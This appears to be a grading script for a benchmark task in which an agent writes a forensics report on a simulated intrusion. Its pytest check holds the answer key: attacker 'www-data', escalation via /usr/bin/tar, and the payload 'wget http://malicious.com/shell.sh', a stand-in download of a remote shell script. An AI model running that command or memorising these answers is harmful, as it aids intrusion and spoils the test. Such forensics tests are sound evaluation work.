#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
# test_final_state.py

import os
import json
import pytest

def test_forensics_report_exists_and_valid():
    report_path = "/home/user/forensics_report.json"

    # 1. Check if the file exists
    assert os.path.isfile(report_path), f"The expected report file was not found at {report_path}."

    # 2. Check if the file is valid JSON
    try:
        with open(report_path, 'r') as f:
            report_data = json.load(f)
    except json.JSONDecodeError:
        pytest.fail(f"The file at {report_path} does not contain valid JSON.")
    except Exception as e:
        pytest.fail(f"An error occurred while reading {report_path}: {e}")

    # 3. Verify the schema and contents
    expected_keys = {"attacker", "payload", "escalation_binary"}
    actual_keys = set(report_data.keys())

    missing_keys = expected_keys - actual_keys
    assert not missing_keys, f"The JSON report is missing the following required keys: {missing_keys}"

    expected_attacker = "www-data"
    expected_payload = "wget http://malicious.com/shell.sh"
    expected_binary = "/usr/bin/tar"

    assert report_data["attacker"] == expected_attacker, \
        f"Expected 'attacker' to be '{expected_attacker}', but got '{report_data['attacker']}'."

    assert report_data["payload"] == expected_payload, \
        f"Expected 'payload' to be '{expected_payload}', but got '{report_data['payload']}'."

    assert report_data["escalation_binary"] == expected_binary, \
        f"Expected 'escalation_binary' to be '{expected_binary}', but got '{report_data['escalation_binary']}'."
TEST_EOF

if python3 -m pytest --noconftest -c /dev/null -p no:cacheprovider /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
